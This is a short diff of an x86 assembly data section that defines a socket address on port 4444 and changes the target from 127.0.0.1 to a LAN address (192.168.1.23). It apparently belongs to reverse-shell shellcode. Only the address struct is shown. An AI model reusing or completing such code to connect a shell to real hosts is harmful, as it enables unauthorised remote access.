@@ -9,7 +9,8 @@ section .data
     server_addr:
        dw 2             ; AF_INET
        dw 0x5c11        ; port 4444 (0x115c → 0x5c11 in little-endian)
-       dd 0x0100007f    ; 127.0.0.1 (0x7F000001)
+       ;dd 0x0100007f    ; 127.0.0.1 (0x7F000001)
+       dd 0x1701a8c0
        times 8 db 0
     server_addr_len equ 16
 
